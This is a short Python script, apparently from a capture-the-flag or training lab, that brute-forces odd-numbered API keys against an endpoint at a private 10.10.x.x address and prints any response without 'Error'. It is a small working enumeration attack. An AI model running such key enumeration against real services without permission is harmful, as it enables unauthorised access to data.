#!/usr/bin/python3

import requests

api_key = 1

for api_key in range(1,100,2):
    #print(api_key)
    html = requests.get("http://10.10.192.234:8000/api/{}".format(api_key))
    if "Error" not in html.text:
        print(html.text)
